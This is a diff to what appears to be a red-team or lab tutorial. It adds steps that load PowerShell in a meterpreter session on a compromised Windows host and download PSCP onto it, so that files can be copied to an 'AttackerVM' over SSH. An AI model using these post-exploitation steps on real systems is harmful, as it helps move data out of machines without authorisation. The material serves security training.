@@ -434,7 +434,7 @@ plink -ssh #{user}@#{server}
 Example: C:\>plink -ssh root@192.168.101.1
 ```
 
-Alternatively, we can use another PuTTY SSH module called PSCP. PSCP (PuTTY Secure Copy Protocol) is a command-line tool for transferring files and folders from a Windows computer to a Linux computer.
+Alternatively, we can use another PuTTY SSH module called `PSCP`. PSCP (PuTTY Secure Copy Protocol) is a command-line tool for transferring files and folders from a Windows computer to a Linux computer.
 
 But before that, we need to check if SSH port is already open our the AttackerVM:
 
@@ -449,6 +449,20 @@ You can execute the following command to install and enable the remote SSH open 
 ```bash
 service ssh start
 service ssh status
+```
+
+Now, let's get back to the meterpreter> console and load powershell module:
+
+```bash
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+```
+
+Then start to download `PSCP` using the following command:
+
+```ps
+Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
 
